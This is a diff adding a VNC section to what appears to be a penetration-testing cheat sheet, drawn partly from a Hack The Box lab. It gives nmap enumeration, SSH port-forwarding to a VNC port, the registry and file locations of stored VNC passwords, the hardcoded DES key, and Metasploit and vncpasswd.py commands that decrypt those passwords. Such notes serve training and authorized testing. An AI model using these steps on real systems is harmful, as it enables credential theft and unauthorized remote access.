@@ -446,3 +446,84 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 
 ```
+
+### <ins>5901 - VNC</ins>
+
+```
+
+Enumeration
+
+nmap -p 5900 --script=*vnc* <IP>
+
+Connect to a VNC service
+
+- Requires valid credentials
+ 
+vncviewer 192.168.1.218:<PN>
+
+vncviewer 127.0.0.1:5000 -passwd secret
+
+When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option.
+
+- Connecting to VNC using Port-forward:   
+
+# ssh -L [local-port]:[remote-ip]:[remote-port]
+
+​
+ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
+
+ssh -L 5000:localhost:5901 charix@10.10.10.84
+
+#verify
+
+netstat -an | grep LIST
+
+
+Decrypting Passwords
+
+
+VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines. Reference:[https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)​
+
+- _RealVNC_ HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver Value: Password
+    
+
+- _TightVNC_ HKEY_CURRENT_USER\Software\TightVNC\Server HKLM\SOFTWARE\TightVNC\Server\
+    
+
+- tightvnc.ini vnc_viewer.ini Value: Password or PasswordViewOnly
+    
+
+- _TigerVNC_ HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 Value: Password
+    
+
+- _UltraVNC_ C:\Program Files\UltraVNC\ultravnc.ini Value: passwd or passwd2
+    
+
+#Decrypt with Metasploit
+
+msf5 > irb
+
+key = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+
+require 'rex/proto/rfb'
+
+Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), key
+
+
+
+GitHub - trinitronx/vncpasswd.py: A Python implementation of vncpasswd, w/decryption abilities & extra features ;-)
+
+GitHub
+
+
+(https://github.com/trinitronx/vncpasswd.py)
+
+- **-d:** decrypt
+    
+
+- **-f:** file
+    
+
+python vncpasswd.py -d -f ../../htb/poison/secret
+
+```
